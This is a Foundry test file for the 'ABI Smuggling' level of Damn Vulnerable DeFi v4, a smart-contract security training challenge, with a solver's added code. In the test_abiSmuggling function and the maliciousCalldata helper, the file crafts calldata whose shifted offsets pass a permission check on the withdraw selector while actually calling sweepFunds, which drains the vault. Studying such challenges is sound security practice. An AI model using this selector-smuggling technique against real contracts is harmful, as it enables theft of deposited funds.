// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {SelfAuthorizedVault, AuthorizedExecutor, IERC20} from "../../src/abi-smuggling/SelfAuthorizedVault.sol";

contract ABISmugglingChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 1_000_000e18;

    DamnValuableToken token;
    SelfAuthorizedVault vault;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        //_isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy vault
        vault = new SelfAuthorizedVault();

        // Set permissions in the vault
        //sweepfunds函数
        bytes32 deployerPermission = vault.getActionId(hex"85fb709d", deployer, address(vault));
        //withdraw的action id
        bytes32 playerPermission = vault.getActionId(hex"d9caed12", player, address(vault));
        bytes32[] memory permissions = new bytes32[](2);
        permissions[0] = deployerPermission;
        permissions[1] = playerPermission;
        vault.setPermissions(permissions);

        // Fund the vault with tokens
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        // Vault is initialized
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertTrue(vault.initialized());

        // Token balances are correct
        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
        assertEq(token.balanceOf(player), 0);

        // Cannot call Vault directly
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.sweepFunds(deployer, IERC20(address(token)));
        vm.prank(player);
        vm.expectRevert(SelfAuthorizedVault.CallerNotAllowed.selector);
        vault.withdraw(address(token), player, 1e18);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    //    function withdraw(address token, address recipient, uint256 amount) external onlyThis {
    //checkSolvedByPlayer
    function test_abiSmuggling() public checkSolvedByPlayer {
        bytes32 withdrawSelector;
        bytes memory attackCalldata = abi.encodePacked(
            hex"1cff79cd", // execute函数选择器
            abi.encode(address(vault)), // 目标地址（vault合约地址）
            uint256(0x60), // 新的偏移量
            withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)")),
            uint256(0x44), // 新的长度
            hex"85fb709d", // sweepFunds函数选择器
            abi.encode(recovery), // recovery地址
            abi.encode(IERC20(address(token))) // token地址
        );
        //bytes memory attackCalldata = maliciousCalldata();
        console.logBytes(attackCalldata);
        // 执行攻击
        (bool success, bytes memory result) = address(vault).call(attackCalldata);
        if (!success) {
            console.log("attack failed");
            if (result.length > 0) {
                // 尝试解码错误信息
                console.logBytes(result);
            }
        } else {
            console.log("success");
        }
        _isSolved();
    }
    //smuggledCalldata =  abi.encodePacked(smuggledCalldata,new bytes(32 3 - 4));
    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */

    function maliciousCalldata() public view returns (bytes memory) {
        bytes memory exDataSelector = abi.encodePacked(bytes4(keccak256("execute(address,bytes)"))); // packed encoding without padding
        address vaultAddr = address(vault);
        // offset to the start of sweepFunds in uint (because uint is padded to the left)
        uint256 offset = 128;
        // append zero bytes for withdraw's selector to be at 100th byte position
        bytes32 zeroBytes = 0;
        bytes4 withdrawSelector = bytes4(keccak256("withdraw(address,address,uint256)"));
        // actual calldata size
        uint256 calldataSize = 68;
        bytes4 sweepFundsSelector = bytes4(keccak256("sweepFunds(address,address)"));

        // we must concatenate padded bytes to avoid unnecessary zeroes
        return bytes.concat(
            exDataSelector, // 0x1cff79cd
            abi.encode(
                vaultAddr, // first parameter for execute() function
                offset, // offset to sweepFundsSelector
                zeroBytes, // appended bytes
                withdrawSelector, // d9caed12
                calldataSize // calldata starts here (calldata length)
            ),
            sweepFundsSelector, // 85fb709d
            abi.encode(recovery, address(token)) // parameters for sweepFunds()
        );
    }

    function _isSolved() private view {
        // All tokens taken from the vault and deposited into the designated recovery account
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
